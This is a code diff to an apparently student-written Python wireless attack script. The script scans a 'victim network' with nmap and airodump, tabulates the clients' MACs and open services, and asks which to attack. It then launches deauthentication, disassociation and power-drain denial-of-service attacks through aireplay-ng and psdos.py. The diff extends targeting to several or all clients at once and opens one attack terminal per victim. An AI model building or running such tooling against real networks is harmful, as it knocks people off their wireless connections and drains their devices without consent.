@@ -71,9 +71,9 @@ def dump_network_info(Info):
         # Get IPs
         sp = subprocess.Popen(["ip", "addr", "show", interface], stdout=subprocess.PIPE)
         ips = subprocess.check_output(["grep", "inet", "-m", "1"], stdin=sp.stdout).decode()[9:26]
-        # print(ips)
+        print(ips)
         sp.wait()
-        nmap = subprocess.call(["nmap", "-n", "-sV", "-oX", FILE_PREFIX+".xml", ips], stdout=subprocess.DEVNULL) # should we print nmap results to screen too?
+        nmap = subprocess.call(["nmap", "-n", "-sV", "-oX", "-T4", FILE_PREFIX+".xml", ips], stdout=subprocess.DEVNULL) # should we print nmap results to screen too?
         print("Done.\n")
     else:
         print("You are not connected to " + victim_network + ".\n")
@@ -114,8 +114,7 @@ def create_target_table():
     clients  = dict()
 
     ap = parse_airodump(clients, Client)
-    # print(ap)
-
+    
     nmap_success = parse_nmap(clients, Client, Service, ap)
 
     # Create a sorted list of clients by ip first and then by power
@@ -124,9 +123,9 @@ def create_target_table():
 
     clients_table = gen_clients_table(clients, nmap_success)
 
-    victim = handle_victims_choices(clients_table, clients)
+    victims = handle_victims_choices(clients_table, clients)
 
-    return victim
+    return victims
 
 def parse_airodump(clients, Client):
     """
@@ -209,9 +208,13 @@ def gen_clients_table(clients, nmap_success):
             for s in c.services:
                 services_table.add_row([s.port, s.state, s.service])
 
-        manuf = subprocess.check_output(["python", "manuf.py", c.mac]).decode().split("comment=u'")[1][:-3]
+        try:
+            manuf = subprocess.check_output(["python", "manuf.py", c.mac]).decode().split("comment=u'")[1][:-3]
+        except Exception as e:
+            manuf = subprocess.check_output(["python", "manuf.py", c.mac]).decode().split("comment=")[1][:-2]
 
-        if nmap_success:
+
+        if nmap_success and c.services:
             clients_table.add_row([i, c.mac, manuf, c.ip, c.power, services_table])
         else:
             clients_table.add_row([i, c.mac, manuf, c.power])
@@ -222,23 +225,29 @@ def handle_victims_choices(clients_table, clients):
     """
     Returns a list of victims (a subset of the clients) when the user enters
     valid, comma-separted indices or enters 'A' to target all clients.
-    """ 
-    # return victims
-    victim = None
-    while not victim:
+    """
+    victims = []
+    while not victims:
         print("\n\n\n")
         print(clients_table)
-        user_input = input("Who would you like to attack? Enter 'A' to attack the access point: ").strip()
-        if user_input.lower() == 'a':
-            return victim
+        print("WARNING: A new terminal will be created for each victim chosen when executing attacks.")
+        user_input = input("Who would you like to attack? (Separate " + 
+                           "indices by commas or enter 'A' for all.) ").strip()
+        if user_input.lower() == "a":
+            victims = [client.mac for client in clients]
         else:
             try:
-                victim = clients[int(user_input)].mac
+                victim_indices = list(map(str.strip, user_input.split(",")))
+                victim_indices = map(int, victim_indices)
+                for i in victim_indices:
+                    victims.append(clients[i].mac)
             except Exception as e:
-                print("Please enter a number from 0- ".format(len(clients)-1))
-    return victim
+                victims = []
+                print("Enter a comma-separated list of numbers or 'A' for all " +
+                       "(exception: {})".format(e))
+    return victims
 
-def execute_hack(info, victim):
+def execute_hack(info, victims):
     """
     Takes some information (WHAT?) in order to attack the victim.
     """
@@ -265,12 +274,14 @@ def execute_hack(info, victim):
     print ("\nSend the kill signal to end the program! Ctrl+C")
 
     # CHECK VICTIMS
-    if victim is not None:
+    if victims:
         user_input = input("Enter A for AUTH DoS, D for DISASSOC DoS, P for POWER DRAIN, T for TKIP DoS: ").strip()
         if user_input.lower() == "d": # Disassociation DoS
-            subprocess.call(["sudo", "aireplay-ng", "-0", "0", "-a", info.bssid, "-c", victim, "-e", info.ssid, info.mon_interface])
+            for vic in victims:
+                subprocess.call(["x-terminal-emulator","-e","sudo", "aireplay-ng", "-0", "0", "-a", info.bssid, "-c", vic, "-e", info.ssid, info.mon_interface])
         elif user_input.lower() == "p": # Power Drain
-            subprocess.call(["sudo", "python", "psdos.py", info.mon_interface, victim, info.bssid, "nullfunction"])
+            for vic in victims:
+                subprocess.call(["x-terminal-emulator","-e","sudo", "python", "psdos.py", info.mon_interface, vic, info.bssid, "nullfunction"])
     else:
         user_input = input("Enter A for AUTH DoS or T for TKIP DoS: ").strip()
         if user_input.lower() == "a": # Authentication DoS
@@ -284,8 +295,8 @@ if __name__ == "__main__":
 
         clean_old_results()
         info = dump_network_info(Info)
-        victim = create_target_table()
-        execute_hack(info, victim)
+        victims = create_target_table()
+        execute_hack(info, victims)
         print("uber l33t haxxing just happened")
     else:
         print("Script requires root access to perform network operations.")
